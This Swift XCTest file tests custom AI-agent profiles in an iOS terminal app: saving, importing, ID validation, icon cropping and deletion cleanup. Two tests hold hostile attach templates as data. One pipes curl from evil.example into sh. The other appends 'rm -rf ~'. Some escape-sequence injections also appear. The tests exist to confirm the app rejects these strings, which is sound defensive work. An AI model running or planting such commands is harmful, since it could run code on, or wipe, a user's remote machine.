import UIKit
import XCTest
@testable import aPlusTerminal

/// Custom agents: the ProfileStore write path (upsert, delete, import,
/// export, damaged files), id and marker rules, and the icon pipeline's crop
/// and fallback.
@MainActor
final class CustomAgentsTests: XCTestCase {
    private var dir: URL!
    private var userURL: URL!
    /// Icon ids this test wrote into the (real) App Group, removed after.
    private var iconIDs: [String] = []

    override func setUpWithError() throws {
        dir = FileManager.default.temporaryDirectory.appendingPathComponent("agents-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        userURL = dir.appendingPathComponent("profiles.json")
    }

    override func tearDownWithError() throws {
        for id in iconIDs { CustomAgentIconStore.clear(for: id) }
        try? FileManager.default.removeItem(at: dir)
    }

    private func fakeAgent(id: String = "custom-fake-agent-abc123", name: String = "Fake Agent") -> AgentProfile {
        AgentProfile(id: id, displayName: name, detectionMarkers: ["fakeagent v1 ready"],
                     attachTemplate: "{path} ", builtIn: false)
    }

    /// A solid-color PNG, optionally split into three vertical bands so a
    /// crop can be told apart from a pad.
    private func png(width: CGFloat, height: CGFloat, bands: [UIColor]) -> Data {
        let format = UIGraphicsImageRendererFormat()
        format.scale = 1
        return UIGraphicsImageRenderer(size: CGSize(width: width, height: height), format: format).pngData { ctx in
            let bandWidth = width / CGFloat(bands.count)
            for (i, color) in bands.enumerated() {
                color.setFill()
                ctx.fill(CGRect(x: CGFloat(i) * bandWidth, y: 0, width: bandWidth, height: height))
            }
        }
    }

    private func pixel(_ image: UIImage, x: Int, y: Int) -> (r: UInt8, g: UInt8, b: UInt8, a: UInt8) {
        let cg = image.cgImage!
        var bytes = [UInt8](repeating: 0, count: 4)
        let ctx = CGContext(data: &bytes, width: 1, height: 1, bitsPerComponent: 8, bytesPerRow: 4,
                            space: CGColorSpaceCreateDeviceRGB(),
                            bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
        ctx.draw(cg, in: CGRect(x: -x, y: -(cg.height - 1 - y), width: cg.width, height: cg.height))
        return (bytes[0], bytes[1], bytes[2], bytes[3])
    }

    // MARK: - Persistence

    func testUpsertSaveReloadDeletePersistAcrossInstances() throws {
        let store = ProfileStore(userFileURL: userURL)
        try store.upsert(fakeAgent())
        XCTAssertEqual(store.agent(id: "custom-fake-agent-abc123")?.displayName, "Fake Agent")

        // A brand-new store on the same file sees it: it was written to disk.
        let second = ProfileStore(userFileURL: userURL)
        XCTAssertEqual(second.customAgents.map(\.id), ["custom-fake-agent-abc123"])
        XCTAssertEqual(second.agent(id: "custom-fake-agent-abc123")?.detectionMarkers, ["fakeagent v1 ready"])
        XCTAssertNotNil(second.agent(id: "claude-code"), "built-ins still load alongside")

        var renamed = second.agent(id: "custom-fake-agent-abc123")!
        renamed.displayName = "Renamed Agent"
        try second.upsert(renamed)
        XCTAssertEqual(ProfileStore(userFileURL: userURL).agent(id: renamed.id)?.displayName, "Renamed Agent")

        try second.deleteAgent(id: renamed.id)
        let third = ProfileStore(userFileURL: userURL)
        XCTAssertNil(third.agent(id: renamed.id), "delete persisted")
        XCTAssertTrue(third.customAgents.isEmpty)
    }

    func testSavePreservesUserMultiplexersAndBuiltInOverrides() throws {
        let json = """
        {"agents":[{"id":"claude-code","displayName":"My Claude","detectionMarkers":["claude code"]}],
         "multiplexers":[{"id":"my-mux","displayName":"My Mux"}]}
        """
        try Data(json.utf8).write(to: userURL)
        let store = ProfileStore(userFileURL: userURL)
        try store.upsert(fakeAgent())

        let reloaded = ProfileStore(userFileURL: userURL)
        XCTAssertEqual(reloaded.agent(id: "claude-code")?.displayName, "My Claude", "override survived a save")
        XCTAssertNotNil(reloaded.multiplexer(id: "my-mux"), "user multiplexer survived a save")
        XCTAssertEqual(reloaded.customAgents.map(\.id), ["custom-fake-agent-abc123"],
                       "a built-in override is not listed as a custom agent")
        XCTAssertFalse(reloaded.builtInAgents.contains { $0.id == "generic" })
    }

    func testUpsertRejectsMissingMarkersAndNameWithoutChangingAnything() throws {
        let store = ProfileStore(userFileURL: userURL)
        var noMarkers = fakeAgent()
        noMarkers.detectionMarkers = ["   ", ""]
        XCTAssertThrowsError(try store.upsert(noMarkers)) { error in
            XCTAssertEqual(error as? ProfileStore.ProfileError, .noDetectionMarkers("Fake Agent"))
        }
        var noName = fakeAgent()
        noName.displayName = "  "
        XCTAssertThrowsError(try store.upsert(noName)) { error in
            XCTAssertEqual(error as? ProfileStore.ProfileError, .emptyName("custom-fake-agent-abc123"))
        }
        XCTAssertTrue(store.customAgents.isEmpty)
        XCTAssertFalse(FileManager.default.fileExists(atPath: userURL.path), "nothing was written")
    }

    func testDamagedUserFileIsKeptAsideNotWipedBySave() throws {
        let damaged = Data("{\"agents\":[{\"id\":\"custom-x\",".utf8)
        try damaged.write(to: userURL)
        let store = ProfileStore(userFileURL: userURL)
        let message = try XCTUnwrap(store.loadError, "a damaged file is reported, not silently dropped")
        // Application Support isn't browsable (no file sharing): the message
        // must not send the user looking for the file in Files.
        XCTAssertTrue(message.contains("kept on this device"), message)
        XCTAssertFalse(message.contains("unreadable-"), "no internal file name: \(message)")

        let aside = try FileManager.default.contentsOfDirectory(atPath: dir.path)
            .filter { $0.hasPrefix("profiles.unreadable-") }
        XCTAssertEqual(aside.count, 1, "the damaged file was moved aside")
        XCTAssertEqual(try Data(contentsOf: dir.appendingPathComponent(aside[0])), damaged,
                       "byte-for-byte, so the user can recover it")

        try store.upsert(fakeAgent())  // the next save must not touch the kept copy
        XCTAssertEqual(try Data(contentsOf: dir.appendingPathComponent(aside[0])), damaged)
        XCTAssertNil(ProfileStore(userFileURL: userURL).loadError, "the fresh file loads cleanly")
    }

    // MARK: - Import / export

    func testImportValidBundleAddsAgents() throws {
        let store = ProfileStore(userFileURL: userURL)
        // Only "agents" — the lenient bundle decoder must not demand "multiplexers".
        let json = """
        {"agents":[{"id":"custom-mytool","displayName":"  My Tool ","detectionMarkers":["  MyTool  ","mytool"],
                    "busyMarkers":["Working…"],"quietInterval":2,"burstThreshold":-5}]}
        """
        let imported = try store.importBundle(Data(json.utf8))
        XCTAssertEqual(imported.map(\.id), ["custom-mytool"])
        let agent = try XCTUnwrap(ProfileStore(userFileURL: userURL).agent(id: "custom-mytool"))
        XCTAssertEqual(agent.displayName, "My Tool")
        XCTAssertEqual(agent.detectionMarkers, ["mytool"], "trimmed, lowercased, deduped")
        XCTAssertEqual(agent.busyMarkers, ["working…"])
        XCTAssertNil(agent.quietInterval, "equal to the default → stored as nil")
        XCTAssertEqual(agent.burstThreshold, AgentProfile.burstThresholdRange.lowerBound, "clamped")
        XCTAssertFalse(agent.builtIn)
    }

    func testImportMalformedJSONThrowsAndLeavesStoreUnchanged() throws {
        let store = ProfileStore(userFileURL: userURL)
        try store.upsert(fakeAgent())
        let before = store.agents
        let fileBefore = try Data(contentsOf: userURL)

        XCTAssertThrowsError(try store.importBundle(Data("{\"agents\": [ {\"id\": ".utf8))) { error in
            guard case .malformedJSON = error as? ProfileStore.ProfileError else {
                return XCTFail("expected malformedJSON, got \(error)")
            }
            let message = (error as? LocalizedError)?.errorDescription ?? ""
            XCTAssertTrue(message.contains("isn't a valid agents file"), "user-presentable: \(message)")
        }
        XCTAssertThrowsError(try store.importBundle(Data("[1,2,3]".utf8)))
        XCTAssertThrowsError(try store.importBundle(Data("{}".utf8))) { error in
            XCTAssertEqual(error as? ProfileStore.ProfileError, .noAgents)
        }
        XCTAssertEqual(store.agents, before, "store unchanged")
        XCTAssertEqual(try Data(contentsOf: userURL), fileBefore, "file unchanged")
    }

    func testImportRejectsPathLikeAndInvalidIDs() throws {
        let store = ProfileStore(userFileURL: userURL)
        // Path-like or malformed, the pickers' "auto"/"none" mode tags, and any
        // id without the "custom-" prefix (a future built-in could take it).
        for id in ["../escape", "a/b", "UPPER", "", String(repeating: "a", count: 65), "dots.png",
                   "auto", "none", "cursor", "custom-", "custom-../x"] {
            let json = #"{"agents":[{"id":"\#(id)","displayName":"X","detectionMarkers":["x"]}]}"#
            XCTAssertThrowsError(try store.importBundle(Data(json.utf8)), id) { error in
                XCTAssertEqual(error as? ProfileStore.ProfileError, .invalidID(id))
            }
        }
        XCTAssertTrue(store.customAgents.isEmpty)
    }

    func testImportIsAllOrNothingAndHasAClearCollisionPolicy() throws {
        let store = ProfileStore(userFileURL: userURL)
        try store.upsert(fakeAgent())

        // A later bad entry rejects the whole file: the good first one is not added.
        let mixed = """
        {"agents":[{"id":"custom-good","displayName":"Good","detectionMarkers":["good"]},
                   {"id":"custom-bad","displayName":"Bad","detectionMarkers":[]}]}
        """
        XCTAssertThrowsError(try store.importBundle(Data(mixed.utf8))) { error in
            XCTAssertEqual(error as? ProfileStore.ProfileError, .noDetectionMarkers("Bad"))
        }
        XCTAssertNil(store.agent(id: "custom-good"))

        // Built-in ids are refused; an existing custom id is replaced in place.
        let builtIn = #"{"agents":[{"id":"claude-code","displayName":"Mine","detectionMarkers":["x"]}]}"#
        XCTAssertThrowsError(try store.importBundle(Data(builtIn.utf8))) { error in
            XCTAssertEqual(error as? ProfileStore.ProfileError, .reservedID("claude-code"))
        }
        let duplicate = """
        {"agents":[{"id":"custom-dup","displayName":"A","detectionMarkers":["a"]},
                   {"id":"custom-dup","displayName":"B","detectionMarkers":["b"]}]}
        """
        XCTAssertThrowsError(try store.importBundle(Data(duplicate.utf8))) { error in
            XCTAssertEqual(error as? ProfileStore.ProfileError, .duplicateID("custom-dup"))
        }
        let update = #"{"agents":[{"id":"custom-fake-agent-abc123","displayName":"Fake Agent 2","detectionMarkers":["fakeagent v2"]}]}"#
        try store.importBundle(Data(update.utf8))
        XCTAssertEqual(store.customAgents.count, 1, "replaced, not duplicated")
        XCTAssertEqual(store.agent(id: "custom-fake-agent-abc123")?.displayName, "Fake Agent 2")
    }

    /// A shared file must not be able to plant a command: attach text is
    /// typed into the remote shell after an upload, and a newline (or any
    /// control character) would submit it without the user pressing Return.
    func testImportRejectsAttachTextThatCouldRunACommand() throws {
        let store = ProfileStore(userFileURL: userURL)
        try store.upsert(fakeAgent())
        let fileBefore = try Data(contentsOf: userURL)
        let unsafe = [
            "{path}; curl -s https://evil.example/x | sh\n",  // the attack: auto-submitted
            "{path}\r",
            "\u{1B}[200~{path}",                              // escape sequence
            "\u{03}{path}",                                    // ^C
            "{path}\u{2028}",                                  // Unicode line separator
            "no placeholder at all",
            "{path}" + String(repeating: "x", count: AgentProfile.attachTemplateMaxLength),
        ]
        for template in unsafe {
            let agent: [String: Any] = ["id": "custom-helper", "displayName": "Helper",
                                        "detectionMarkers": ["last login"], "attachTemplate": template]
            let data = try JSONSerialization.data(withJSONObject: ["agents": [agent]])
            XCTAssertThrowsError(try store.importBundle(data), template.debugDescription) { error in
                XCTAssertEqual(error as? ProfileStore.ProfileError, .unsafeAttachTemplate("Helper"))
                let message = (error as? LocalizedError)?.errorDescription ?? ""
                XCTAssertTrue(message.contains("never presses Return"), message)
            }
        }
        XCTAssertNil(store.agent(id: "custom-helper"))
        XCTAssertEqual(try Data(contentsOf: userURL), fileBefore, "file unchanged")

        // Plain text around {path} is fine: the user sees it on the prompt.
        let ok = #"{"agents":[{"id":"custom-helper","displayName":"Helper","detectionMarkers":["helper"],"attachTemplate":"/attach {path} "}]}"#
        try store.importBundle(Data(ok.utf8))
        XCTAssertEqual(store.agent(id: "custom-helper")?.formatAttachment(path: "/x/y.png"), "/attach /x/y.png ")

        // The editor's save path is held to the same rule.
        var edited = try XCTUnwrap(store.agent(id: "custom-helper"))
        edited.attachTemplate = "{path}\n"
        XCTAssertThrowsError(try store.upsert(edited)) { error in
            XCTAssertEqual(error as? ProfileStore.ProfileError, .unsafeAttachTemplate("Helper"))
        }
    }

    /// A user file that never went through validation (older build, hand
    /// edit) still can't give a custom agent submitting attach text; a
    /// built-in override keeps its own (aider's `/add {path}\n` is real).
    func testLoadedCustomAgentNeverKeepsUnsafeAttachText() throws {
        let json = """
        {"agents":[{"id":"custom-old","displayName":"Old","detectionMarkers":["old"],"attachTemplate":"{path}; rm -rf ~\\n"},
                   {"id":"aider","displayName":"aider","detectionMarkers":["aider"],"attachTemplate":"/add {path}\\n"}]}
        """
        try Data(json.utf8).write(to: userURL)
        let store = ProfileStore(userFileURL: userURL)
        XCTAssertEqual(store.agent(id: "custom-old")?.attachTemplate, AgentProfile.defaultAttachTemplate)
        XCTAssertEqual(store.agent(id: "aider")?.attachTemplate, "/add {path}\n")
    }

    /// The no-disk seam keeps the profiles it was given across writes; it
    /// used to re-merge against the real bundle and list built-ins such as
    /// codex as "custom".
    func testInMemoryStoreKeepsInjectedProfilesAcrossWrites() throws {
        let claude = AgentProfile(id: "claude-code", displayName: "Claude Code",
                                  detectionMarkers: ["claude code"], attachTemplate: "{path} ")
        let generic = AgentProfile(id: "generic", displayName: "Agent", detectionMarkers: [], attachTemplate: "{path} ")
        let none = MultiplexerProfile(id: "none", displayName: "None (raw shell)")
        let store = ProfileStore(agents: [generic, claude], multiplexers: [none])
        try store.upsert(fakeAgent())
        XCTAssertEqual(store.agents.map(\.id), ["generic", "claude-code", "custom-fake-agent-abc123"])
        XCTAssertEqual(store.multiplexers.map(\.id), ["none"])
        XCTAssertEqual(store.customAgents.map(\.id), ["custom-fake-agent-abc123"])
        try store.importBundle(Data(#"{"agents":[{"id":"custom-two","displayName":"Two","detectionMarkers":["two"]}]}"#.utf8))
        try store.deleteAgent(id: "custom-fake-agent-abc123")
        store.reload()
        XCTAssertEqual(store.agents.map(\.id), ["generic", "claude-code", "custom-two"])
        XCTAssertNil(store.agent(id: "codex"), "the real bundle never leaks in")
    }

    func testExportRoundTripsWithoutIcons() throws {
        let store = ProfileStore(userFileURL: userURL)
        var agent = fakeAgent()
        agent.busyMarkers = ["thinking"]
        agent.quietInterval = 5
        try store.upsert(agent)
        XCTAssertTrue(CustomAgentIconStore.save(png(width: 40, height: 40, bands: [.red]), for: agent.id))
        iconIDs.append(agent.id)

        let data = store.exportData(agentIDs: [agent.id])
        let text = String(decoding: data, as: UTF8.self)
        XCTAssertFalse(text.lowercased().contains("icon"), "icons never leave the device")
        XCTAssertFalse(text.contains("claude-code"), "only the requested agents")
        let object = try XCTUnwrap(JSONSerialization.jsonObject(with: data) as? [String: Any])
        XCTAssertEqual((object["multiplexers"] as? [Any])?.count, 0, "same bundle shape")

        let other = ProfileStore(userFileURL: dir.appendingPathComponent("other.json"))
        let imported = try other.importBundle(data)
        XCTAssertEqual(imported, [store.agent(id: agent.id)!], "export → import is lossless")
    }

    // MARK: - Ids and markers

    func testMarkerNormalization() {
        XCTAssertEqual(
            AgentProfile.normalizedMarkers(["  FakeAgent ", "fakeagent", "", "   ", "Ready\n", "ready"]),
            ["fakeagent", "ready"])
    }

    func testGeneratedIDsAreValidUniqueAndPrefixed() {
        let id = AgentProfile.makeCustomID(displayName: "My Tool ✨ v2!")
        XCTAssertTrue(id.hasPrefix("custom-my-tool-v2-"), id)
        XCTAssertTrue(AgentProfile.isValidID(id))
        XCTAssertTrue(AgentProfile.isValidID(AgentProfile.makeCustomID(displayName: "✨✨")))
        XCTAssertTrue(AgentProfile.isValidID(AgentProfile.makeCustomID(displayName: String(repeating: "long name ", count: 20))))
        let ids = Set((0..<200).map { _ in AgentProfile.makeCustomID(displayName: "x") })
        XCTAssertEqual(ids.count, 200)
    }

    // MARK: - Legal

    func testBundledLegalDocumentsRenderAsWritten() throws {
        // Settings › Legal parses these as inline-only Markdown that keeps
        // whitespace: a "# Heading" shows its hashes, and a line wrapped in
        // the source breaks mid-sentence on screen.
        for name in ["PrivacyPolicy", "LicenseAgreement", "ThirdPartyNotices"] {
            let url = try XCTUnwrap(Bundle.main.url(forResource: name, withExtension: "md"),
                                    "\(name).md is not bundled")
            let text = try String(contentsOf: url, encoding: .utf8)
            for line in text.split(separator: "\n") {
                XCTAssertFalse(line.hasPrefix("#"), "\(name).md shows a literal heading: \(line)")
            }
        }
        // The notices are prose: one source line per paragraph.
        let url = try XCTUnwrap(Bundle.main.url(forResource: "ThirdPartyNotices", withExtension: "md"))
        let notices = try String(contentsOf: url, encoding: .utf8)
        for paragraph in notices.components(separatedBy: "\n\n") {
            XCTAssertFalse(paragraph.trimmingCharacters(in: .whitespacesAndNewlines).contains("\n"),
                           "a hard-wrapped paragraph breaks mid-sentence: \(paragraph)")
        }
        XCTAssertTrue(notices.contains("not affiliated with"), "the not-affiliated notice must stay")
    }

    // MARK: - Icons

    func testIconsSavedBeforeTheExclusionAreExcludedAtLaunch() throws {
        // Builds 70–75 never set the exclusion, and a write is what sets it
        // now, so an icon those builds saved would stay eligible for backup
        // until the user picks a new one. The launch pass must cover it.
        let id = "custom-old-\(UUID().uuidString.prefix(8).lowercased())"
        iconIDs.append(id)
        XCTAssertTrue(CustomAgentIconStore.save(png(width: 40, height: 40, bands: [.red]), for: id))
        var dir = try XCTUnwrap(CustomAgentIconStore.imageURL(for: id)).deletingLastPathComponent()
        var values = URLResourceValues()
        values.isExcludedFromBackup = false
        try dir.setResourceValues(values)
        dir.removeAllCachedResourceValues()
        XCTAssertFalse(CustomAgentIconStore.isExcludedFromBackupForTesting(), "precondition: an old build's folder")

        CustomAgentIconStore.excludeStoredIconsFromBackup()
        XCTAssertTrue(CustomAgentIconStore.isExcludedFromBackupForTesting(),
                      "icons already on disk stay in backups until the next write")
    }

    func testIconIsCenterCroppedTo360Square() throws {
        let id = "custom-crop-\(UUID().uuidString.prefix(8).lowercased())"
        iconIDs.append(id)
        // 300×100, three bands: red | green | blue. A center crop keeps only
        // green; the old aspect-fit pad left transparent bars top and bottom.
        let source = png(width: 300, height: 100, bands: [.red, .green, .blue])
        XCTAssertTrue(CustomAgentIconStore.save(source, for: id))
        XCTAssertTrue(CustomAgentIconStore.isExcludedFromBackupForTesting(),
                      "user icons stay on this device: not in iCloud or computer backups")
        let url = try XCTUnwrap(CustomAgentIconStore.imageURL(for: id))
        let image = try XCTUnwrap(UIImage(contentsOfFile: url.path))
        XCTAssertEqual(image.cgImage?.width, 360)
        XCTAssertEqual(image.cgImage?.height, 360)
        for (x, y) in [(2, 2), (357, 2), (2, 357), (357, 357), (180, 180)] {
            let p = pixel(image, x: x, y: y)
            XCTAssertEqual(p.a, 255, "opaque at \(x),\(y): cropped, not padded")
            XCTAssertGreaterThan(p.g, 200, "green at \(x),\(y)")
            XCTAssertLessThan(p.r, 60, "no red band at \(x),\(y)")
            XCTAssertLessThan(p.b, 60, "no blue band at \(x),\(y)")
        }
    }

    func testIconStoreRefusesPathLikeIDs() {
        let data = png(width: 10, height: 10, bands: [.red])
        XCTAssertFalse(CustomAgentIconStore.save(data, for: "../escape"))
        XCTAssertFalse(CustomAgentIconStore.save(data, for: "a/b"))
        XCTAssertNil(CustomAgentIconStore.imageURL(for: "../escape"))
    }

    func testIconSourceFallsBackToGenericForCustomAgentWithoutArt() throws {
        let id = "custom-noart-\(UUID().uuidString.prefix(8).lowercased())"
        iconIDs.append(id)
        XCTAssertEqual(CustomAgentIconStore.source(forIconName: "agent-\(id)"), .generic,
                       "no PNG and no bundled asset → generic doodle, not a blank image")
        XCTAssertEqual(CustomAgentIconStore.Source.generic.assetName, "agent-generic")
        XCTAssertNotNil(UIImage(named: "agent-generic"), "the fallback asset ships")
        XCTAssertEqual(CustomAgentIconStore.source(forIconName: "agent-claude-code"), .bundled("agent-claude-code"))

        XCTAssertTrue(CustomAgentIconStore.save(png(width: 50, height: 80, bands: [.orange]), for: id))
        guard case .custom(let url) = CustomAgentIconStore.source(forIconName: "agent-\(id)") else {
            return XCTFail("a saved PNG wins")
        }
        // The exact App Group path the widget reads (it compiles this same file).
        let container = try XCTUnwrap(FileManager.default.containerURL(
            forSecurityApplicationGroupIdentifier: CustomAgentIconStore.groupID))
        XCTAssertEqual(url.standardizedFileURL.path,
                       container.appendingPathComponent("AgentIcons/\(id).png").standardizedFileURL.path)

        try ProfileStore(userFileURL: userURL).upsert(fakeAgent(id: id))
        try ProfileStore(userFileURL: userURL).deleteAgent(id: id)
        XCTAssertNil(CustomAgentIconStore.imageURL(for: id), "deleting the agent removes its icon")
    }

    // MARK: - Session surfaces

    func testEffectiveAgentIconNameForCustomAgent() throws {
        let store = ProfileStore(userFileURL: userURL)
        try store.upsert(fakeAgent())
        let suffix = UUID().uuidString
        let settings = AppSettings(defaults: UserDefaults(suiteName: "CustomAgentsTests-\(suffix)")!)
        let session = TerminalSession(
            server: Server(name: "x", host: "127.0.0.1", username: "u"),
            keyStore: KeyStore(secrets: InMemorySecretStore(),
                               metadataURL: dir.appendingPathComponent("keys.json")),
            serverStore: ServerStore(fileURL: dir.appendingPathComponent("servers.json")),
            passwords: PasswordStore(secrets: InMemorySecretStore()),
            settings: settings,
            profiles: store)
        XCTAssertNil(session.effectiveAgentIconName)
        // The row-refresh wiring (onDetectedChange → revision) is
        // SessionManager's and is tested through `SessionManager.open` in
        // SessionManagerTests.testCustomAgentLatchBumpsRowRevision.
        session.agentMonitor.observe(Array("FakeAgent v1 ready\n".utf8))
        XCTAssertEqual(session.agentMonitor.detected?.id, "custom-fake-agent-abc123")
        XCTAssertEqual(session.effectiveAgentIconName, "agent-custom-fake-agent-abc123")
        XCTAssertEqual(session.effectiveAgentName, "Fake Agent")
    }

    func testDeleteClearsDefaultAndServerReferences() throws {
        let store = ProfileStore(userFileURL: userURL)
        try store.upsert(fakeAgent())
        try store.upsert(fakeAgent(id: "custom-keep-me", name: "Keep"))
        let settings = AppSettings(defaults: UserDefaults(suiteName: "CustomAgentsTests-\(UUID().uuidString)")!)
        let servers = ServerStore(fileURL: dir.appendingPathComponent("servers.json"))
        settings.defaultAgentProfileID = "custom-fake-agent-abc123"
        var pointing = Server(name: "a", host: "h", username: "u")
        pointing.agentProfileID = "custom-fake-agent-abc123"
        var other = Server(name: "b", host: "h", username: "u")
        other.agentProfileID = "custom-keep-me"
        servers.add(pointing)
        servers.add(other)

        try store.deleteAgent(id: "custom-fake-agent-abc123", settings: settings, servers: servers)
        XCTAssertEqual(settings.defaultAgentProfileID, "auto")
        XCTAssertNil(servers.server(for: pointing.id)?.agentProfileID, "back to 'use default'")
        XCTAssertEqual(servers.server(for: other.id)?.agentProfileID, "custom-keep-me", "others untouched")
        XCTAssertNil(ServerStore(fileURL: dir.appendingPathComponent("servers.json"))
            .server(for: pointing.id)?.agentProfileID, "persisted")
    }
}
